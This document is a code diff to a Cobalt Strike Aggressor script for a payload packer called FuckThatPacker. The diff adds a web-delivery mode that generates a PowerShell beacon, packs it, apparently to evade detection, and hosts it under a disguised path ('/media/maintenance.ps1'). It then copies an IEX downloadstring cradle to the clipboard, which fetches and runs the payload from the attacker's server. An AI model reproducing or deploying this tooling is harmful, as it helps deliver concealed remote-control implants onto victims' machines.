@@ -1,18 +1,24 @@
+$FuckThatPackerPath = "/home/kali/Desktop/packers/FuckThatPacker/";
+$OutputPath = "/home/kali/Desktop/packers/FuckThatPacker/temp/";
+$OutputPacked = "/home/kali/Desktop/packers/FuckThatPacker/temp/packed.ps1"; #Use just for web delivery
+
 sub generatePacker {
         $key = $3['key'];
         $listener = $3['listener'];
         $output = $3['output'];
         $data = artifact_payload($listener,"powershell","x64");
-        $handle = openf(">/tmp/temp_nonpacked.ps1");
+        $handle = openf(">" . $OutputPath . "temp_nonpacked.ps1");
         writeb($handle, $data);
         closef($handle);
-        $cmd = "/opt/Tools/FuckThatPacker/FuckThatPacker.py -k ". $key . " -p /tmp/temp_nonpacked.ps1 -o " . $output;
+        $cmd = $FuckThatPackerPath . "FuckThatPacker.py -k ". $key . " -p " . $OutputPath . "temp_nonpacked.ps1 -o " . $output;
         $out = exec($cmd);
         $data = readAll($out);
         println("[+] Packed payload stored in $output")
+        show_message("Beacon generated, stored in " . $3['output']); 
 }
+
 sub fuckThatPacker {
-        $dialog = dialog("FuckThatPacker", %(listener => "Listener: ", payload_type => "Payload Type: ", Output => "Output: "), &generatePacker);
+        $dialog = dialog("FuckThatPacker", %(listener => "Listener ", payload_type => "Payload Type: ", key => "64", output => "/tmp/FuckThatBeacon.ps1"), &generatePacker);
         dialog_description($dialog, "Generates a packed powershell payload.\n Author Unknow101");
         drow_listener($dialog, "listener", "Listener: ");
         drow_text($dialog, "key", "Key : ");
@@ -21,10 +27,49 @@ sub fuckThatPacker {
         dialog_show($dialog);
 }
 
+sub fuckThatPackerWebDelivery {
+	$dialog = dialog("FuckThatPacker (web delivery)", %(listener => "Listener ", key => "64", payload_type => "Payload Type: ", Local_Host => localip(), Port => "80", PathHTTPServ => "/media/maintenance.ps1"), &generatePackerAndHost);
+        dialog_description($dialog, "Generates a packed powershell payload.\n Author Unknow101");
+        drow_listener($dialog, "listener", "Listener: ");
+        drow_text($dialog, "key", "Key : ");
+        drow_text($dialog, "Local_Host", "Local Host : ");
+        drow_text($dialog, "Port", "Port : ");
+        drow_text($dialog, "PathHTTPServ", "Path : ");
+        dbutton_action($dialog, "Generate");
+        dialog_show($dialog);
+}
 
+sub generatePackerAndHost {
+        $key = $3['key'];
+        $listener = $3['listener'];
+        $output = $3['output'];
+        $data = artifact_payload($listener,"powershell","x64");
+        $handle = openf(">" .$OutputPath . "temp_nonpacked.ps1");
+        writeb($handle, $data);
+        closef($handle);
+        $cmdwebexec = $FuckThatPackerPath . "FuckThatPacker.py -k ". $key . " -p " . $OutputPath . "temp_nonpacked.ps1 -o " . $OutputPacked;
+        $out = exec($cmdwebexec);
+        @data = readAll($out);
+        println("[+] Packed payload stored in " . $OutputPacked);
+	$f = openf($OutputPacked);
+	$content = readAll($f, -1);
+	closef($f);	
+	foreach $line ($content) {
+		$packedData .= $line . "\r\n";
+	}	
+        println("[+]Start to host payload");
+        site_host($3['Local_Host'], $3['Port'], $3['PathHTTPServ'], $packedData, "text/plain", "Hosted by FuckThatPacker (web delivery)", false);
+        $hosted_path = "http://" . $3['Local_Host'] . ":" . $3['Port'] . $3['PathHTTPServ'] . "')";
+        println("[+]Payload URL : " . $hosted_path);
+        show_message("IEX ((new-object net.webclient).downloadstring('" . $hosted_path . ")"); 
+        add_to_clipboard("IEX ((new-object net.webclient).downloadstring('" . $hosted_path . ")");      
+}
 
 popup attacks{
         item ("FuckThatPacker", { 
                 fuckThatPacker();
+        });        
+        item ("FuckThatPacker (web delivery)", { 
+                fuckThatPackerWebDelivery();
         });
 }
